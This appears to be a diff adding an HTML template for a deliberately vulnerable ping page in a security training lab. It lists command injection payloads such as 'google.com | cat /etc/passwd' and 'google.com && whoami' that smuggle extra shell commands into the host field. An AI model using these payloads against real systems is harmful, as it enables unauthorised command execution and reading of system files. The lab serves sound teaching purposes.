@@ -1,0 +1,31 @@
+{% extends "base.html" %}
+
+{% block content %}
+<h2>🌐 Network Ping Tool (Command Injection)</h2>
+
+<div class="card">
+    <form method="POST" action="/ping">
+        <label>Host to ping:</label>
+        <input type="text" name="host" placeholder="e.g., google.com" required>
+        <button type="submit" class="btn">Ping</button>
+    </form>
+</div>
+
+{% if result %}
+<div class="card">
+    <h3>Result:</h3>
+    <pre style="background: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto;">{{ result }}</pre>
+</div>
+{% endif %}
+
+<div class="card">
+    <h3>💉 Command Injection Payloads</h3>
+    <p>Try these payloads to execute arbitrary commands:</p>
+    <ul style="margin-left: 20px; line-height: 2;">
+        <li><code>google.com; ls -la</code> (list directory)</li>
+        <li><code>google.com && whoami</code> (show current user)</li>
+        <li><code>google.com | cat /etc/passwd</code> (read system files)</li>
+        <li><code>google.com; pwd</code> (show current directory)</li>
+    </ul>
+</div>
+{% endblock %}
